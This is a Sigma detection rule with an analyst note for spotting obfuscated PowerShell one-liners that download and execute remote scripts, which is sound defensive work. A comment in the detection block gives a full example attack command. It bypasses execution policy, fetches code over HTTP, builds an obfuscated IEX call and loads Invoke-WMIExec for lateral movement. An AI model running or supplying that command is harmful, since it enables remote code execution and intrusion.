logsource:
  product: windows
  category: process_creation
detection:
  selection:
        # Example: powershell -nop -noni -ep bypass -w h -c "$u=("http://127.0.0.1:1337/"|%%{(IRM $_)});&("".SubString.ToString()[67,72,64]-Join"")($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"
    Image|endswith: '\powershell.exe'
    CommandLine|contains|all:
    - 'http://127.0.0.1'
    - '%{(IRM $_)}'
    - 'Invoke'
  condition: selection
falsepositives:
- Unknown
level: high
note: |
  ### Technical Context

  This rule detects the execution of obfuscated PowerShell one-liners that are used to download and execute malicious scripts and modules from a remote location, particularly via HTTP. The likely objective of the attacker is to deploy payloads or perform lateral movement through malicious PowerShell commands, which can lead to further exploitation or data exfiltration. The relevant MITRE ATT&CK tactics and techniques include Execution (T1059.001) and Defense Evasion (T1685).

  Primary telemetry sources include Windows process creation logs, specifically focusing on Event ID 4688, which captures new process creation events. The security impact is significant, as successful execution may allow attackers to gain unauthorized access, circumvent defense measures, and deploy additional malware. However, this detection does not confirm that the detected behavior is inherently malicious as it may also capture legitimate PowerShell use by administrators or automated scripts.

  ### Investigation Steps

  - **Examine Process Creation Events:**
    Review Windows Security logs for Event ID 4688, filtering for process creation by `powershell.exe`. Look specifically at the CommandLine field for signs of the detection pattern, such as obfuscated commands containing the HTTP URLs.

  - **Correlate with Network Activity:**
    Cross-reference detected command executions with network traffic logs, particularly looking for outbound HTTP requests to suspicious IPs or domains. Use firewall or proxy logs (e.g., Web Proxy logs) to check for unusual external connections.

  - **Identify Indicators of Compromise:**
    Look for the presence of known malicious scripts or modules in downloaded content, such as `Invoke-WMIExec.ps1`, on target systems. Check paths to temporary files or unusual file extensions indicative of payloads in the filesystem.

  - **Validate Legitimate PowerShell Usage:**
    Investigate the user context under which the PowerShell command was executed. Confirm whether the actions align with administrative or scheduled tasks. Administrative PowerShell scripts should typically not include obfuscation techniques like `%{(IRM $_)}`.

  - **Assess User Permissions and Context:**
    Examine the user account executing the PowerShell command, noting if it has elevated privileges that could signify potential abuse when executing inline commands that download and run scripts.

  ### Prioritization

  This alert is categorized as high severity given that PowerShell is frequently abused for post-exploitation activities and the affected systems are often critical infrastructure. The likelihood of exploitation through such obfuscated commands is significant, as attackers commonly leverage these techniques to bypass defenses and execute their payloads undetected.

  ### Blind Spots and Assumptions

  Detection may be limited by the use of legitimate obfuscation techniques within benign PowerShell scripts, which could trigger false positives. Additionally, required log sources include fully enabled Windows process auditing and potential gaps may occur if PowerShell logging is not configured comprehensively. Legitimate administrative tasks, particularly in automation or patch management, may unintentionally trigger alerts. Implementing companion detections for known malicious file hashes or unusual PowerShell module imports can strengthen overall security coverage.

